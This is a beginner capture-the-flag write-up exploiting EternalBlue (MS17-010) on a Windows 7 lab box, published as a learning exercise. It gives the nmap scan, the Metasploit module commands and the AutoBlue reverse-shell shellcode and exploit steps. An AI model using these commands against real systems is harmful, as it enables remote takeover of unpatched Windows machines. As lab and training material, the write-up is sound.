# TCM Blue — CTF Writeup (EternalBlue / MS17-010)

**Platform:** TCM Security  
**Difficulty:** Beginner  
**Author:** [Olamideoyek](https://medium.com/@olamideoyek)  
**Full Walkthrough:** [Read on Medium](https://medium.com/@olamideoyek/tcm-blue-walkthrough-131f154256b9)

---

## Overview

A Windows 7 target vulnerable to the **MS17-010 (EternalBlue)** SMB remote code execution vulnerability. The box was exploited two ways: first via the Metasploit module for immediate SYSTEM-level access with no privilege escalation required, and second manually using **AutoBlue-MS17-010** to generate and deliver custom shellcode.

---

## Attack Chain Summary

```
Host Discovery (Netdiscover) → Nmap Scan → Vulnerability Research (MS17-010)
→ Metasploit Exploitation (EternalBlue) → SYSTEM Access
→ [Manual Method] AutoBlue Shellcode Generation → Listener Setup
→ Manual SMB Exploitation → Target Crash (BSOD) Confirming Vulnerability
```

---

## Step 1 — Host Discovery

```bash
netdiscover
```

Used to identify the IP address of the target machine on the local network (login credentials were also provided directly for the box).

---

## Step 2 — Port Scanning & Enumeration

```bash
nmap <target-ip>
```

Standard Nmap scan performed to identify open ports and services, including SMB (port 445), which is the entry point for the EternalBlue exploit.

---

## Step 3 — Vulnerability Research

A search for known exploits affecting the target's SMB service pointed to **MS17-010 (EternalBlue)**, documented on Rapid7:

🔗 [rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)

---

## Step 4 — Exploitation via Metasploit

```bash
msfconsole

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target-ip>
run
```

The exploit executed successfully, granting **SYSTEM-level access immediately** — no privilege escalation step was required, as EternalBlue exploits a kernel-level SMB vulnerability directly.

---

## Step 5 — Manual Exploitation with AutoBlue-MS17-010

As an alternative method, the **AutoBlue-MS17-010** toolkit (by 3ndG4me) was used to manually craft and deliver the exploit:

🔗 [github.com/3ndg4me/AutoBlue-MS17-010](https://github.com/3ndg4me/AutoBlue-MS17-010)

### Clone the Repository
```bash
git clone https://github.com/3ndg4me/AutoBlue-MS17-010.git
```

### Generate Shellcode
```bash
cd AutoBlue-MS17-010/shellcode
./shell_prep.sh
```

Prompts for **LHOST** (attacker IP) and other parameters; compiles Windows shellcode and generates a payload via **msfvenom**.

### Set Up Listener
A listener (e.g. `nc` or a Metasploit multi/handler) was configured using the same `LHOST`/`LPORT` parameters set during shellcode generation.

### Execute the Exploit
```bash
cd AutoBlue-MS17-010
python2 eternalblue_exploit7.py <target-ip> shellcode/sc_x64.bin
```

The script initiates the SMB exploitation process against the target and displays connection status.

### Result
The Windows 7 target crashed with a **Blue Screen of Death (BSOD)**:

```
DRIVER_IRQL_NOT_LESS_OR_EQUAL
```

This confirmed successful interaction with — and exploitation of — the vulnerable SMB service at the kernel level.

---

## Key Findings Summary

| Method | Outcome |
|--------|---------|
| Metasploit `ms17_010_eternalblue` | SYSTEM access obtained immediately, no privesc needed |
| Manual AutoBlue-MS17-010 | Triggered kernel crash (BSOD) — confirms raw exploit mechanics |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `netdiscover` | Host discovery on local network |
| `nmap` | Port scanning & service enumeration |
| Metasploit (`ms17_010_eternalblue`) | Automated EternalBlue exploitation |
| `AutoBlue-MS17-010` | Manual shellcode generation and delivery |
| `msfvenom` | Payload/shellcode generation |
| Netcat / Metasploit handler | Reverse connection listener |

---

## Key Takeaways

- **EternalBlue (MS17-010)** remains one of the most well-known SMB vulnerabilities, notably used in the WannaCry and NotPetya outbreaks — it grants SYSTEM access directly with no need for further privilege escalation.
- **Metasploit modules** provide fast, reliable exploitation but understanding the manual method (AutoBlue) builds deeper insight into how the exploit actually works at the shellcode/payload level.
- Unpatched, legacy Windows systems (like Windows 7 without the MS17-010 patch) remain a serious liability on any network.
- A BSOD during exploitation is a strong indicator of a successful kernel-level interaction, even when the payload doesn't fully land — useful for confirming vulnerability presence during testing.

---

> ⚠️ **Disclaimer:** This walkthrough was performed in an isolated lab environment for educational purposes only.
